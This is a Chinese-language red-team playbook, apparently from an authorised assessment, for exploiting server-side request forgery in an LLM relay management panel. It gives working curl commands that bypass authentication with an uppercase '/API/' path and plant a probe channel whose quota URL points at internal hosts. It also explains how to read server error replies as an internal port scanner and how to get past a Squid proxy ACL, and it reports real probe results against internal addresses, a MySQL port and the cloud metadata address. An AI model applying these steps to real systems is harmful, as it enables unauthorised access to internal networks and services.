# 背景
这类自研 LLM 中转面板的渠道对象里，`config` 字段往往含多个"服务端会主动出站"的键：
`quota.url`（查额度，**完整 URL**）、`apikey_path`（拉 key）、`base_url`（上游地址）、`video_api_path`、`CHECK_LIST`、`proxy_urls`。
其中 **`quota.url` 是最干净的 SSRF 入口**：触发只需一次 GET、响应回显、不进入上游模型请求逻辑。

# 一、找到触发点（从管理前端源码读调用契约，而不是盲猜）
读 `/assets/pages/*.js`，见 keys 页：
```js
const keyInfo = await api(`/api/channel/${encodeURIComponent(name)}/info?skipQuota=1`);
```
`skipQuota=1` 的存在即证明：**不带这个参数，服务端就会去请求该渠道的 `config.quota.url`**。
→ 触发方式：`GET /api/channel/<渠道名>/info`（**不要**带 skipQuota）。
（若该面板鉴权中间件有大小写缺陷，用 `/API/` 大写绕过；本例 `/api/*` 401 → `/API/*` 200。）

# 二、写探针：用临时渠道，绝不动现有业务渠道
```bash
# 干净基线（务必先备份 + 记 MD5，回滚靠它）
curl -sk --noproxy "*" http://TARGET/API/admin/channels -o baseline.json
md5sum baseline.json

# ① 创建临时探针渠道 —— 三个条件缺一不可（详见第四节踩坑）
curl -sk --noproxy "*" -X POST http://TARGET/API/admin/channels \
  -H 'Content-Type: application/json' -d '{
    "name":"rtprobe","type":"openai_chat","base_url":null,
    "api_keys":["sk-test-fake-000"],"model_map":{},
    "config":{"quota":{"url":"http://<目标>:<端口>/","style":"usage-token"}},
    "enabled":true,"remark":"rtprobe-direct-ssrf"}'

# ② 逐跳：只改 config.quota.url 一个字段
curl -sk --noproxy "*" -X PUT http://TARGET/API/admin/channels/rtprobe \
  -H 'Content-Type: application/json' -d '{"name":"rtprobe","type":"openai_chat","base_url":null,
    "api_keys":["sk-test-fake-000"],"model_map":{},
    "config":{"quota":{"url":"http://172.17.0.1:47891/","style":"usage-token"}},
    "enabled":true,"remark":"rtprobe-direct-ssrf"}'

# ③ 触发（不带 skipQuota），从响应 quota[].error 读服务端 errno
curl -sk --noproxy "*" http://TARGET/API/channel/rtprobe/info

# ④ 收工必删 + 校验回基线
curl -sk --noproxy "*" -X DELETE http://TARGET/API/admin/channels/rtprobe
curl -sk --noproxy "*" http://TARGET/API/admin/channels -o after.json && md5sum after.json  # 必须与基线一致
```

# 三、读数（判据表）——响应里 `quota:[{...,"error":"..."}]` 直接告诉你服务端看到了什么
| 服务端回显 | 含义 |
|---|---|
| `connect ECONNREFUSED <ip>:<port>` | **IP 可达、端口关闭**（Node 内核 errno） |
| `connect EHOSTUNREACH` | 不可路由 |
| 挂起数十秒超时 | SYN 无回应（丢包/防火墙 DROP） |
| `Parse Error: Expected HTTP/, RTSP/ or ICE/` | **TCP 连上了但目标不是 HTTP**（如 MySQL 3306） |
| `HTTP 400: ` | 目标是 **HTTP 代理**（对非绝对 URL 的标准响应） |
| `Unexpected token '<', "<!DOCTYPE "` | **成功取回 HTML 内容**（style 解析器把 HTML 当 JSON 解析失败，错误里回显了前若干字节） |
| `{"success":true,"data":{...}}` | 目标返回了符合该 style 的 JSON，**完整内容已回显** |
通过 ECONNREFUSED / EHOSTUNREACH / 超时 三态即可做**端口可达性探测**；配合不同 `style` 值可改变成功响应的解析口径。

# 四、三个必要条件（踩过坑才会知道，缺一则读数无效）
1. **`enabled` 必须为 true** —— 否则渠道不被加载，`GET /api/channel/<name>/info` **恒 404** `{"error":"Channel 'x' not found"}`，写探针会静默失效（第一轮 20 跳全废）。
2. **`type` 必须用 base 类型**（如 `openai_chat`）—— 若用自定义类型（如 `nvidia`），`/info` 会返回**整个该类型池的 keys**（实测 387,744 字节），把 `quota` 字段挤出观测窗口，且响应体积随 keys 状态抖动、读数不可用。
3. **`api_keys` 必须非空** —— quota 是**按 key 逐个查**的；空 keys 时服务端直接返回 `"quota":[]` 且**完全不发任何请求**（耗时恒 0.5s/68B，会被误判为"目标不可达"）。赋一个**假 key**（`sk-test-fake-000`）即触发，且不消耗任何真实上游额度。

# 五、为什么这类面板能绕过前置代理 ACL
同一面板的不同出站路径可能用**不同的 HTTP 客户端实现**：走代理的那条（如把 URL 当上游 `base_url` 请求）会读 `HTTP_PROXY` 环境变量并强制经 Squid，被 `ERR_ACCESS_DENIED` 拦；而 **quota 拉取那条用了不读代理环境变量的客户端，直接 TCP 出站**。
**判据**：若同一地址在 A 面得到 Squid 的 HTML 错误页 `ERR_ACCESS_DENIED`、在 B 面得到 **Node 内核 errno**（`ECONNREFUSED`/`EHOSTUNREACH`），则 B 面**不经代理**。另可辅以形态差异：Squid ACL 拒绝恒定数百毫秒立即返回，而直连不可达地址会**挂起数十秒**。
→ **面板上任何"服务端主动取 URL"的配置字段都要分别测一遍，不要因为一个字段被代理拦就放弃整个面。**

# 六、成果定性必须做外网可达性对照（避免误报）
宿主机 = 目标公网 IP 时，`172.17.0.1:<port>` 上的服务很可能**外网本来就能访问**（`172.17.0.1` 只是 docker0 网关视角）。**先禁用代理直连公网 IP 的同名端口做对照**：
```bash
socket.connect((PUBLIC_IP, port), timeout=3)   # 或 curl.exe --noproxy "*"
```
外网可达的端口 → 不算新突破，不得计分；**只有"外网直连不可达、而经 SSRF 可达"的端口（如本例宿主机防火墙内的 `172.17.0.1:47891` HTTP 代理）才是真正跨越边界的成果**。

# 七、二级跳不可行（已实测证伪，别再试）
**不要**指望把宿主机上的代理端口写进渠道 `config.proxy_urls` 来做代理级联 —— 实测**无效**：
```bash
PUT /API/admin/channels/rtprobe  {...,"config":{"proxy_urls":["http://127.0.0.1:1"],   # 故意用关闭的端口
     "quota":{"url":"http://example.com/","style":"usage-token"}}}
GET /API/channel/rtprobe/info
→ 200, 0.562s, error: Unexpected token '<', "<!doctype "... is not valid JSON
```
若 `proxy_urls` 被读取，服务端应先连代理而报 `ECONNREFUSED 127.0.0.1:1`；实际却**成功取回了 example.com 的 HTML** ⇒ **quota 客户端完全无视 `config.proxy_urls`**。
**归纳 quota 面客户端的特性：既不读 HTTP 代理环境变量（故绕过 Squid ACL），也不读渠道 `config.proxy_urls`（故无法指向我方代理）—— 是一个不受我们控制的裸直连客户端，只能用被探测的目标 URL 本身操纵，无法借它做代理级联。**
（注：若 `proxy_urls` 在**上游 chat 请求**那条路径上被读取，则可能借助 Squid→二级代理形成链路，那是另一条代码路径，需另行验证。）

# 八、本例（tgt7737-org / 203.0.113.105:13030）的完整读数与定性
17 跳读数：`127.0.0.1:13030/login.html` 取回 `<!DOCTYPE `（自证成功）；`172.17.0.1:47891` 返回 `HTTP 400`（HTTP 代理）；`172.17.0.1:80` 取回 `<html>`；`172.17.0.1:3306` 报 `Parse Error`（MySQL）；`172.17.0.1:2375/2376` 与 `172.18.0.1:2375` 报 `ECONNREFUSED`（Docker API 未开放）；`169.254.169.254` 报 `EHOSTUNREACH`；`10.0.0.1`/`192.168.1.1`/`172.16.0.1`/`172.20.0.1` 全部挂起超时。
外网对照：`:80`/`:443`/`:3306`/`:13030`/`:9089`/`:15555` 外网开放，而 `:2375`/`:2376`/`:6379`/`:8080`/`:47891` 外网不可达 ⇒ 只有 `47891` 是真突破。
产物：`vuln_id=58`（critical）、`http_evidence id=46`、`chain seq=121`；探针渠道已全部 DELETE，回滚后全量 channels MD5 回到基线 `D10706E28CA0822580E34BAC21742374`、渠道数 105、残留 0。
